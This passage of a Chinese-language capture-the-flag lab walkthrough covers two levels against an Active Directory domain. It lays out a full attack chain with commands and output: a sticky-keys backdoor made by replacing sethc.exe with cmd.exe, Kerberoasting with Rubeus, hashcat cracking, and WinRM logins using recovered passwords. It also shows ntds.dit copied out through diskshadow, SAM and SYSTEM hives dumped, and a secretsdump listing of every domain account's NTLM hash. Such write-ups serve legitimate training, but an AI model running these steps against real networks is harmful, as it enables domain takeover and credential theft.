*Evil-WinRM* PS C:\Users\zhangshuai\Documents> $AccessRule = New-Object System.Security.AccessControl.RegistryAccessRule($User, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> $Acl.SetAccessRule($AccessRule)
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> Set-Acl -Path $Path -AclObject $Acl
Requested registry access is not allowed.
At line:1 char:1
+ Set-Acl -Path $Path -AclObject $Acl
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (HKEY_LOCAL_MACH...ecution Options:String) [Set-Acl], SecurityException
    + FullyQualifiedErrorId : System.Security.SecurityException,Microsoft.PowerShell.Commands.SetAclCommand
```

在无法修改注册表的情况下，可以利用 SeRestorePrivilege 特权，将 sethc.exe 文件进行删除（或修改名称），再将 cmd.exe 重命名为 sethc.exe 即可进行镜像劫持：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> whoami /priv

特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeRestorePrivilege            还原文件和目录 已启用
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> Remove-Item -Path "C:\Windows\System32\sethc.exe" -Force
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> Rename-Item -Path "C:\Windows\System32\cmd.exe" -NewName "C:\Windows\System32\sethc.exe"
```

远程桌面登录后锁屏，触发 sethc.exe 镜像劫持：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/62cf23c560b8f3e9.png)

此时拥有 SYSTEM 权限，查看 C:\Users\Administrator\flag\flag03.txt 文件即可：

```
O~~~~~~~                           O~~
O~~    O~~        O~            O~ O~~
O~~    O~~O~ O~~~   O~~     O~~    O~~   O~~       O~~      O~~
O~~~~~~~   O~~   O~~ O~~   O~~ O~~ O~~ O~   O~~  O~~  O~~ O~   O~~
O~~        O~~   O~~  O~~ O~~  O~~ O~~O~~~~~ O~~O~~   O~~O~~~~~ O~~
O~~        O~~   O~~   O~O~~   O~~ O~~O~         O~~  O~~O~
O~~       O~~~   O~~    O~~    O~~O~~~  O~~~~        O~~   O~~~~
                                                  O~~


flag03: flag{760e1025-9d84-4c28-8af9-d45e9f770734}

```

## 第 4 关

关卡剧情：

尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。

---

使用 BloodHound 进行域环境分析：

```
PS C:\Users\Administrator\Desktop\SharpHound-v1.1.1> .\SharpHound.exe
2023-07-10T22:47:51.1563913+08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-07-10T22:47:51.2965304+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-07-10T22:47:51.3277906+08:00|INFORMATION|Initializing SharpHound at 22:47 on 2023/7/10
2023-07-10T22:47:51.5934121+08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for xiaorang.lab : XR-DC.xiaorang.lab
2023-07-10T22:47:51.7340125+08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-07-10T22:47:52.0309322+08:00|INFORMATION|Beginning LDAP search for xiaorang.lab
2023-07-10T22:47:52.1402748+08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-07-10T22:47:52.1402748+08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-07-10T22:48:23.0059924+08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2023-07-10T22:48:36.8302490+08:00|INFORMATION|Consumers finished, closing output channel
2023-07-10T22:48:36.8937411+08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-07-10T22:48:37.1797942+08:00|INFORMATION|Status: 160 objects finished (+160 3.555556)/s -- Using 42 MB RAM
2023-07-10T22:48:37.1797942+08:00|INFORMATION|Enumeration finished in 00:00:45.1428135
2023-07-10T22:48:37.2657490+08:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 119 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 1 global catalog mappings.
2023-07-10T22:48:37.2750514+08:00|INFORMATION|SharpHound Enumeration Completed at 22:48 on 2023/7/10! Happy Graphing!
```

![image-20231007235656269](https://raw.githubusercontent.com/h0ny/repo/main/images/ea1b735204b6c5a0.png)
分析 "Find Kerberoastable Members of High Value Groups" 发现 TIANJING@XIAORANG.LAB 用户，且该用户属于 BACKUP OPERATORS 组成员，在用户的节点属性中查看到两个 SPN：

| Active Directory Accounts | Active Directory Group Memberships                                                                       | Service Principal Names                                          |
| ------------------------- | -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| TIANJING@XIAORANG.LAB     | DOMAIN USERS@XIAORANG.LAB <br/> BACKUP OPERATORS@XIAORANG.LAB <br/> REMOTE MANAGEMENT USERS@XIAORANG.LAB | TERMSERV/xr-0923.xiaorang.lab <br/> WWW/xr-0923.xiaorang.lab/IIS |

并且用户 TIANJING@XIAORANG.LAB 能够与计算机 XR-DC.XIAORANG.LAB 创建 PSRemote 连接：

![image-20231008000437469](https://raw.githubusercontent.com/h0ny/repo/main/images/9315830e4af613b8.png)

使用这台域内主机进行 Kerberoast/Kerberoasting 攻击：

```
PS C:\Windows\system32> whoami
nt authority\system

PS C:\Users\Administrator\Desktop> .\Rubeus.exe kerberoast /nowrap /format:hashcat
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : xiaorang.lab
[*] Searching path 'LDAP://XR-DC.xiaorang.lab/DC=xiaorang,DC=lab' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : tianjing
[*] DistinguishedName      : CN=tianjing,CN=Users,DC=xiaorang,DC=lab
[*] ServicePrincipalName   : TERMSERV/xr-0923.xiaorang.lab
[*] PwdLastSet             : 2023/5/30 18:25:11
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*tianjing$xiaorang.lab$TERMSERV/xr-0923.xiaorang.lab@xiaorang.lab*$2A4EAAF3A983A2D447014928214AC5AE$A4BBF4D6D9CE801CA54BB7B7F6861FFC7108EF900B8AD50304C1FD7693E5E741A0F0B958616D8CB3DB7E6670314CE0A64F74D1C69060BC830E4811019E9A613DB257DCFA8096FFE3C8E0089B45D2A9DCA0F578CDCDB1311AB81868B11E15F2E5CB4D3AFEC7C470E0AE0FAD91DD48CF5D1271219270243AE1A21D2BD4B7CD9180131B007AF6CA6650F00F54CEE00C8C4C206CCE4B8A820DD8CAA1EF353602332606CAB63A3D3E5958213ECDCE947AE4FDDA0454CD572F4CD0EEDF3D124D91E56B7AD9D5C0514252A7194230EFB8951D9AF28212E285437D9B8812356122FFE6BB2DC611941990424AFB7AC3B367BA22F12AA9220D78793314C6C83F5DEBA7A52FC885EDF3565D573FD6388F2FF9A93C2D6C163C94CF286C30B953AB5F5976949AEA21AED6A0BC2A328154C0C1AB9A1ACC242F5BD92892F007B9DB9309B2D26FDCAD34B23F4AB8262A79B9C15EAB04FD024F0AD13A8667F83142E5EF6966D33293266F185E92B83C37F3E3D3DA03A43A81BC3BA90F15D61ECD315F3699D8FEF9080CFF3F7AE4BE812D4D89AC7B75A5126DE9F30509B74928B88031DD9BD48271F3664BFD56AC124290A28010EB558706CB0F50FB09489E1D40F448E0CEB696D33C7C4DB2C8153D1416AE9445A91778324EB79344CBAD4A26E9A6C9F208838D59032E9E3293D416EC701F35D3F4AC360D06070ADA610E62FD663B6B8350DA3E84A2E2F75A765DF6E0D422C02D0FDE56DD1428F42017408B3677A56BFDCCEFA2006F271649B431A1CCF61BCF402B4900FC986FBF6CE83B15C1C9E12370C535ED2D5BF9C3F08AFEAC06B58E44FAA172C41391FC48A90987455F4F091CD8DED8F588528B658DBD350E6118264C02E0D72C7FD5A138A9454318B2C4E88FA2644ED1641DCC81B7C2FECAAC93AF940F69C64E75E4947FD0C1993E4D847067E37A482033E8ABE868DF6392D8EA0B350F08D65AFFC99E34A88C5DB8979665D78837DBC1AD64160213B95D96B44F584A55092B271DEA46BF51BC7DA45ECD075BAC0E9796C03D05108A4DF9E242FBBD11656186ACE81E72B3E76242611195190774A364B1D68D83FD3997DA494F41D034E12D32352AC83D2D224EEA51E6FCA6974D1C8E8C61F7DC3BD1F47D6CF67586443B422A32469B3A25236D545AA06420D7DDB05BF12D2A25687E9394F85913A8FAFEB6029BE07C8411BCF3D0377748A0C3CC88DB090A565A06CD3FA960E1AAEA440D3F860C1B2048FEC13911415DEB688778CAE3C560E58CB7E787F7203CD591DAC49D2E11722526D78555941CFE7366363350967E69BF0FC6BF585A7B33081026F1579B6B489B06A24F199836EC3F8536F1B36636F72E853E454956D6AC88046EE180744046F3F53E00D37C2F334F36258875E1CBC81CE3735DC025232BE94058137ACC62057BCD9742BF15431856FE6BD9AE1D4A0393D82EF3FC327B77E6C7D91484590D5254DBC45D327016A46F8DC173AEB8288FE57719E03FE8400EFEC75895F981A04A4541DC462DCA3EF3FF14425151D6AFF51F3817BC6D8C0689E86DC64BE9BFA7D1511CEE1DF3375E6684FB8738371BC25E979F4945D8A0487750C5E4735D69B327B1B96FB5B932C06F2599ACB2295BC7AB64BE6271A3F1343DA0E4713B34A24978

```

在获取到域用户 tianjing 的 hash 后，使用 hashcat 离线破解密码：

```
┌──(root㉿kali)-[~]
└─# hashcat -m 13100 hashes.txt rockyou.txt --show
$krb5tgs$23$*tianjing$xiaorang.lab$TERMSERV/xr-0923.xiaorang.lab@xiaorang.lab*$2a4eaaf3a983a2d447014928214ac5ae$a4bbf4d6d9ce801ca54bb7b7f6861ffc7108ef900b8ad50304c1fd7693e5e741a0f0b958616d8cb3db7e6670314ce0a64f74d1c69060bc830e4811019e9a613db257dcfa8096ffe3c8e0089b45d2a9dca0f578cdcdb1311ab81868b11e15f2e5cb4d3afec7c470e0ae0fad91dd48cf5d1271219270243ae1a21d2bd4b7cd9180131b007af6ca6650f00f54cee00c8c4c206cce4b8a820dd8caa1ef353602332606cab63a3d3e5958213ecdce947ae4fdda0454cd572f4cd0eedf3d124d91e56b7ad9d5c0514252a7194230efb8951d9af28212e285437d9b8812356122ffe6bb2dc611941990424afb7ac3b367ba22f12aa9220d78793314c6c83f5deba7a52fc885edf3565d573fd6388f2ff9a93c2d6c163c94cf286c30b953ab5f5976949aea21aed6a0bc2a328154c0c1ab9a1acc242f5bd92892f007b9db9309b2d26fdcad34b23f4ab8262a79b9c15eab04fd024f0ad13a8667f83142e5ef6966d33293266f185e92b83c37f3e3d3da03a43a81bc3ba90f15d61ecd315f3699d8fef9080cff3f7ae4be812d4d89ac7b75a5126de9f30509b74928b88031dd9bd48271f3664bfd56ac124290a28010eb558706cb0f50fb09489e1d40f448e0ceb696d33c7c4db2c8153d1416ae9445a91778324eb79344cbad4a26e9a6c9f208838d59032e9e3293d416ec701f35d3f4ac360d06070ada610e62fd663b6b8350da3e84a2e2f75a765df6e0d422c02d0fde56dd1428f42017408b3677a56bfdccefa2006f271649b431a1ccf61bcf402b4900fc986fbf6ce83b15c1c9e12370c535ed2d5bf9c3f08afeac06b58e44faa172c41391fc48a90987455f4f091cd8ded8f588528b658dbd350e6118264c02e0d72c7fd5a138a9454318b2c4e88fa2644ed1641dcc81b7c2fecaac93af940f69c64e75e4947fd0c1993e4d847067e37a482033e8abe868df6392d8ea0b350f08d65affc99e34a88c5db8979665d78837dbc1ad64160213b95d96b44f584a55092b271dea46bf51bc7da45ecd075bac0e9796c03d05108a4df9e242fbbd11656186ace81e72b3e76242611195190774a364b1d68d83fd3997da494f41d034e12d32352ac83d2d224eea51e6fca6974d1c8e8c61f7dc3bd1f47d6cf67586443b422a32469b3a25236d545aa06420d7ddb05bf12d2a25687e9394f85913a8fafeb6029be07c8411bcf3d0377748a0c3cc88db090a565a06cd3fa960e1aaea440d3f860c1b2048fec13911415deb688778cae3c560e58cb7e787f7203cd591dac49d2e11722526d78555941cfe7366363350967e69bf0fc6bf585a7b33081026f1579b6b489b06a24f199836ec3f8536f1b36636f72e853e454956d6ac88046ee180744046f3f53e00d37c2f334f36258875e1cbc81ce3735dc025232be94058137acc62057bcd9742bf15431856fe6bd9ae1d4a0393d82ef3fc327b77e6c7d91484590d5254dbc45d327016a46f8dc173aeb8288fe57719e03fe8400efec75895f981a04a4541dc462dca3ef3ff14425151d6aff51f3817bc6d8c0689e86dc64be9bfa7d1511cee1df3375e6684fb8738371bc25e979f4945d8a0487750c5e4735d69b327b1b96fb5b932c06f2599acb2295bc7ab64be6271a3f1343da0e4713b34a24978:DPQSXSXgh2
```

使用域用户 tianjing 的凭据去获取主机 XR-DC$ 的 PowerShell 会话（CanPSRemote）：

```console
PS C:\> $LAdmin = "xiaorang.lab\tianjing"
PS C:\> $LPassword = ConvertTo-SecureString "DPQSXSXgh2" -AsPlainText -Force
PS C:\> $Credentials = New-Object -Typename System.Management.Automation.PSCredential -ArgumentList $LAdmin, $LPassword
PS C:\> Enter-PSSession -ComputerName "172.22.14.11" -Credential $Credentials
[172.22.14.11]: PS C:\Users\tianjing\Documents> hostname
XR-DC
[172.22.14.11]: PS C:\Users\tianjing\Documents> whoami
xiaorang\tianjing
```

使用工具 evil-winrm 连接域控 XR-DC$，再利用 [BACKUP OPERATORS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators) 组的特权（SeBackupPrivilege、SeRestorePrivilege），进行卷影拷贝（Shadow Copy）：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tianjing\Documents> whoami /all

用户信息
----------------

用户名            SID
================= =============================================
xiaorang\tianjing S-1-5-21-158000642-3359129478-2926607586-1104


组信息
-----------------

组名                                       类型   SID          属性
========================================== ====== ============ ==============================
Everyone                                   已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Backup Operators                   别名   S-1-5-32-551 必需的组, 启用于默认, 启用的组
BUILTIN\Remote Management Users            别名   S-1-5-32-580 必需的组, 启用于默认, 启用的组
BUILTIN\Users                              别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
BUILTIN\Pre-Windows 2000 Compatible Access 别名   S-1-5-32-554 必需的组, 启用于默认, 启用的组
NT AUTHORITY\NETWORK                       已知组 S-1-5-2      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users           已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization             已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication           已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\High Mandatory Level       标签   S-1-16-12288


特权信息
----------------------

特权名                        描述             状态
============================= ================ ======
SeMachineAccountPrivilege     将工作站添加到域 已启用
SeBackupPrivilege             备份文件和目录   已启用
SeRestorePrivilege            还原文件和目录   已启用
SeShutdownPrivilege           关闭系统         已启用
SeChangeNotifyPrivilege       绕过遍历检查     已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用


用户声明信息
-----------------------

用户声明未知。

已在此设备上禁用对动态访问控制的 Kerberos 支持。
*Evil-WinRM* PS C:\Users\tianjing\Documents>
```

使用 diskshadow 导出 ntds.dit。将以下 diskshadow 命令保存在一个文本文件中：

```
# Set the context to persistent and disable writers
set context persistent nowriters

# Add the C: volume with an alias of "someAlias"
add volume c: alias someAlias

# Create a shadow copy of the volume
create

# Expose the shadow copy as the Z: drive
expose %someAlias% z:

# Execute the backup script or command (absolute path !!!)
# Here, we are using Robocopy in backup mode to copy the NTDS directory from the shadow copy to the C:\temp directory
exec C:\Windows\System32\Robocopy.exe /b z:\Windows\NTDS\ c:\temp\ ntds.dit

# Unexpose the Z: drive
unexpose z:

# Delete the shadow copy
delete shadows volume %someAlias%

# Reset the diskshadow environment
reset

# Exit diskshadow
exit
```

> 注：如果你是使用的 Linux，还需要使用 `unix2dos` 命令将文件的编码和间距转换为 Windows 兼容的编码和间距。

使用 evil-winrm 上传文件到目标服务器后，使用 diskshadow 脚本模式，执行包含 diskshadow 命令的文件：

```
*Evil-WinRM* PS C:\temp> upload ShadowCopy.txt

Info: Uploading /home/kali/ShadowCopy.txt to C:\temp\ShadowCopy.txt

Data: 756 bytes of 756 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\temp> diskshadow /s ./ShadowCopy.txt
Microsoft DiskShadow 版本 1.0
版权所有 (C) 2013 Microsoft Corporation
在计算机上: XR-DC，2023/7/11 15:58:56

-> # Set the context to persistent and disable writers
-> set context persistent nowriters
->
-> # Add the C: volume with an alias of "someAlias"
-> add volume c: alias someAlias
->
-> # Create a shadow copy of the volume
-> create
已将卷影 ID {03de5431-9671-4151-aab1-5f3ad97d9fb8} 的别名 someAlias 设置为环境变量。
已将卷影集 ID {983a0e79-5caf-4bb2-b39f-682fc1f381e0} 的别名 VSS_SHADOW_SET 设置为环境变量。

正在查询卷影副本集 ID 为 {983a0e79-5caf-4bb2-b39f-682fc1f381e0} 的所有卷影副本

        * 卷影副本 ID = {03de5431-9671-4151-aab1-5f3ad97d9fb8}          %someAlias%
                - 卷影副本集: {983a0e79-5caf-4bb2-b39f-682fc1f381e0}    %VSS_SHADOW_SET%
                - 卷影副本原始数 = 1
                - 原始卷名称: \\?\Volume{4790f32e-0000-0000-0000-100000000000}\ [C:\]
                - 创建时间: 2023/7/11 15:58:57
                - 卷影副本设备名称: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy19
                - 原始计算机: XR-DC.xiaorang.lab
                - 服务计算机: XR-DC.xiaorang.lab
                - 未暴露
                - 提供程序 ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - 属性:  No_Auto_Release Persistent No_Writers Differential

已列出的卷影副本数: 1
->
-> # Expose the shadow copy as the Z: drive
-> expose %someAlias% z:
-> %someAlias% = {03de5431-9671-4151-aab1-5f3ad97d9fb8}
已成功将卷影副本暴露为 z:\。
->
-> # Execute the backup script
-> exec C:\Windows\System32\Robocopy.exe /b z:\Windows\NTDS\ c:\temp\ ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Windows 的可靠文件复制
-------------------------------------------------------------------------------

  开始时间: 2023年7月11日 15:58:57
        源: z:\Windows\NTDS\
      目标: c:\temp\

      文件: ntds.dit

      选项: /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\Windows\NTDS\

------------------------------------------------------------------------------

                  总数        复制        跳过       不匹配        失败        其他
       目录:         1         0         1         0         0         0
       文件:         1         0         1         0         0         0
       字节:   16.00 m         0   16.00 m         0         0         0
       时间:   0:00:00   0:00:00                       0:00:00   0:00:00
   已结束: 2023年7月11日 15:58:57

->
-> # Unexpose the Z: drive
-> unexpose z:
卷影副本 ID {03de5431-9671-4151-aab1-5f3ad97d9fb8} 不再暴露。
->
-> # Delete the shadow copy
-> delete shadows volume %someAlias%
-> %someAlias% = {03de5431-9671-4151-aab1-5f3ad97d9fb8}
正在从提供程序 {b5946137-7b9f-4925-af80-51abd60b20d5} [属性: 0x00020019]中删除卷 \\?\Volume{4790f32e-0000-0000-0000-100000000000}\ 上的卷影副本 {03de5431-9671-4151-aab1-5f3ad97d9fb8}...

已删除的卷影副本数: 1
->
-> # Reset the diskshadow environment
-> reset
->
-> # Exit diskshadow
-> exit
*Evil-WinRM* PS C:\temp>
```

转储注册表 hive：

```
*Evil-WinRM* PS C:\temp> reg save hklm\sam c:\temp\sam.hive
操作成功完成。

*Evil-WinRM* PS C:\temp> reg save hklm\system c:\temp\system.hive
操作成功完成。

*Evil-WinRM* PS C:\temp> reg save hklm\security c:\temp\security.hive
reg.exe : 错误: 拒绝访问。
    + CategoryInfo          : NotSpecified: (错误: 拒绝访问。:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

使用 evil-winrm 下载文件到本地：

```
*Evil-WinRM* PS C:\temp> download c:\temp\ntds.dit ./

Info: Downloading c:\temp\ntds.dit to ntds.dit

Info: Download successful!
*Evil-WinRM* PS C:\temp> download c:\temp\sam.hive ./

Info: Downloading c:\temp\sam.hive to sam.hive

Info: Download successful!
*Evil-WinRM* PS C:\temp> download c:\temp\system.hive ./

Info: Downloading c:\temp\system.hive to system.hive

Info: Download successful!
```

解密 ntds.dit 和 hive 文件：

```
┌──(root㉿kali)-[~]
└─# impacket-secretsdump -ntds ntds.dit -sam sam.hive -system system.hive LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64d4b4314b59fb051020a12f09effcac:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 8cca939cb8a94a304d33209b41a99517
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
XR-DC$:1000:aad3b435b51404eeaad3b435b51404ee:28b508bccbc765e1779134fc309ee161:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4b2afb57dd0833ee9ed732ea89c263a3:::
XR-0923$:1103:aad3b435b51404eeaad3b435b51404ee:8519c5a89b2cd4d679a5a36f26863e5d:::
tianjing:1104:aad3b435b51404eeaad3b435b51404ee:c8252441ad9f475d629865fe86b3aecd:::
liyuying:1106:aad3b435b51404eeaad3b435b51404ee:4e77dc688f87c4ebbbe1da95931d25d1:::
wangyuying:1107:aad3b435b51404eeaad3b435b51404ee:f09d261da7841e97bc25e5a95833ee4a:::
yangguiying:1108:aad3b435b51404eeaad3b435b51404ee:93242254318fe496c9d03908c0ab7440:::
zhoumin:1109:aad3b435b51404eeaad3b435b51404ee:fad94b7c69cdbc4376fb17dc78cc858e:::
chenyun:1110:aad3b435b51404eeaad3b435b51404ee:8e41a10b056df5d0c53e8140d4790b21:::
chenmei:1111:aad3b435b51404eeaad3b435b51404ee:d53b17e5763bb9f028211044a32a9267:::
huangmin:1112:aad3b435b51404eeaad3b435b51404ee:9c75fa751d66813d7ed4caa6d2d9af38:::
jiangcheng:1113:aad3b435b51404eeaad3b435b51404ee:9c75fa751d66813d7ed4caa6d2d9af38:::
huanggang:1114:aad3b435b51404eeaad3b435b51404ee:9c75fa751d66813d7ed4caa6d2d9af38:::
machao:1115:aad3b435b51404eeaad3b435b51404ee:9a504875c8fc24ea22c3a27152ed3273:::
liguihua:1119:aad3b435b51404eeaad3b435b51404ee:88c540dbe639451a04a5183ea0e0af0d:::
wangfang:1120:aad3b435b51404eeaad3b435b51404ee:0bf4fdbc625a4435868eb71dbc8307b3:::
liguizhi:1122:aad3b435b51404eeaad3b435b51404ee:51c00743fa6f148926694c830112ae33:::
wangyulan:1123:aad3b435b51404eeaad3b435b51404ee:9b57eb71d89ba4003558cc451c3393ef:::
huachunmei:1126:aad3b435b51404eeaad3b435b51404ee:75fa801c8a5bedcb2b81c4f792ce1024:::
jiadongmei:1127:aad3b435b51404eeaad3b435b51404ee:6ac97d0534c99743bfa52ed5584e916b:::
liguilan:1128:aad3b435b51404eeaad3b435b51404ee:c337e57ca73c99e1eb1da443425da58b:::
yuxuecheng:1129:aad3b435b51404eeaad3b435b51404ee:cfc4835a206d618f1d7ea2bc22cc49ac:::
lixiuying:1130:aad3b435b51404eeaad3b435b51404ee:2e73b44dce942ffe682bb3b4052caa95:::
liguizhen:1134:aad3b435b51404eeaad3b435b51404ee:63d1d7be0b04f6b5b5336434a3d5a518:::
chenjianhua:1135:aad3b435b51404eeaad3b435b51404ee:5e121c3d4d259f35917c9c666c7c3650:::
yangjuan:1138:aad3b435b51404eeaad3b435b51404ee:68868390d1183fb671a371e0929b8a54:::
lidan:1139:aad3b435b51404eeaad3b435b51404ee:4dea8e760936a0d96f906edc4a470add:::
liyang:1140:aad3b435b51404eeaad3b435b51404ee:428aa70becfc16307febab419ecb313c:::
zhaojun:1141:aad3b435b51404eeaad3b435b51404ee:2f8101fa58b9337891ec96ce56b8b2f7:::
chenxin:1145:aad3b435b51404eeaad3b435b51404ee:e0eca1319b608886bc2102ba569a13f6:::
chenfei:1146:aad3b435b51404eeaad3b435b51404ee:dc1d2b7d3939d0002ba8292d1e1b20a4:::
chenhao:1148:aad3b435b51404eeaad3b435b51404ee:1145c8ce1774e134341b1f243eaca68b:::
lifei:1149:aad3b435b51404eeaad3b435b51404ee:3e08a9626cd85505b46166ae57e38ca1:::
zhangfang:1150:aad3b435b51404eeaad3b435b51404ee:010505bc625ab34f2b4e497861c51f13:::
zhangkun:1151:aad3b435b51404eeaad3b435b51404ee:814c056b97ff9cf9bbe4922c4ca32881:::
yanglei:1155:aad3b435b51404eeaad3b435b51404ee:055fd770c62e1b9582c1aeebcb04fc71:::
chenxia:1157:aad3b435b51404eeaad3b435b51404ee:c52d91b91f859c850087fa74e14a9069:::
zhangkai:1160:aad3b435b51404eeaad3b435b51404ee:40fee6e974e30258042a6b845acf41f4:::
liuyu:1161:aad3b435b51404eeaad3b435b51404ee:bafadbab49757fda93da68c7f9f787a7:::
chenming:1163:aad3b435b51404eeaad3b435b51404ee:75f769ecda05fbf6a6848f8398e9b120:::
mali:1164:aad3b435b51404eeaad3b435b51404ee:8a5e14c2a4876105e7c1370d36cfc7a1:::
chengang:1169:aad3b435b51404eeaad3b435b51404ee:8bd93219f6d7921e241415c508473482:::
huangwei:1171:aad3b435b51404eeaad3b435b51404ee:5b681f8a5961a08ad983c05ea976a65e:::
lixia:1174:aad3b435b51404eeaad3b435b51404ee:5fc366da322ac7c3098ab20bb56ffe11:::
xujing:1175:aad3b435b51404eeaad3b435b51404ee:3df64977422013367c25f57cd9d3b2c3:::
zhangjuan:1178:aad3b435b51404eeaad3b435b51404ee:dba8c7706c9c2fea332afe2b8e8a1bba:::
chenhui:1179:aad3b435b51404eeaad3b435b51404ee:78f95a95a9304cf06f1b0a733ac8eee7:::
liying:1181:aad3b435b51404eeaad3b435b51404ee:d3e572a3aa71a4cefe7a8ad65dc4e1ec:::
zhaoli:1182:aad3b435b51404eeaad3b435b51404ee:561b71d50c2614d91e6031a1e44ba3fe:::
zhoujing:1184:aad3b435b51404eeaad3b435b51404ee:1fefe6706ec68bb805361ce5a9944fbc:::
zhaoyong:1189:aad3b435b51404eeaad3b435b51404ee:27bd4f7d5403828b5ed310729119693a:::
wangyu:1192:aad3b435b51404eeaad3b435b51404ee:f1476afff3d4e3e4c97a0e18a88a651f:::
yangli:1193:aad3b435b51404eeaad3b435b51404ee:5d01864d2dc0eca800b7faf6aac91b38:::
yangliu:1196:aad3b435b51404eeaad3b435b51404ee:101fdcd11cd305f78495a8bcd31b02d9:::
wangying:1197:aad3b435b51404eeaad3b435b51404ee:0a8fbc5b333c1a52b4b8089fee9c274a:::
chenjie:1198:aad3b435b51404eeaad3b435b51404ee:fe343db5062c94af05a2c5b2bcfbf8ad:::
yangyong:1199:aad3b435b51404eeaad3b435b51404ee:e03de581dc8e75885672faa7e9f4d498:::
lixin:1201:aad3b435b51404eeaad3b435b51404ee:dd559fcf4523947742dbdc72f9e52e6b:::
zhanghui:1205:aad3b435b51404eeaad3b435b51404ee:ea31fe5bfe9fcbb74613ce13ac81225f:::
chenlin:1208:aad3b435b51404eeaad3b435b51404ee:b8cd9155c7c4e3f2fe535272566420cf:::
chenjuan:1209:aad3b435b51404eeaad3b435b51404ee:38f7a5a37bca7d68b17ad2eb922b44f3:::
chenchen:1215:aad3b435b51404eeaad3b435b51404ee:9e7295616a8faf501b5526f0eaeb5b0c:::
wangbing:1216:aad3b435b51404eeaad3b435b51404ee:d12641f47f63cb00cb5686ab0baa7113:::
chenling:1219:aad3b435b51404eeaad3b435b51404ee:f322cbf95eba279337538777e454abf1:::
yangmei:1220:aad3b435b51404eeaad3b435b51404ee:b50dd4e0fe64b40d91c33a97d4c66784:::
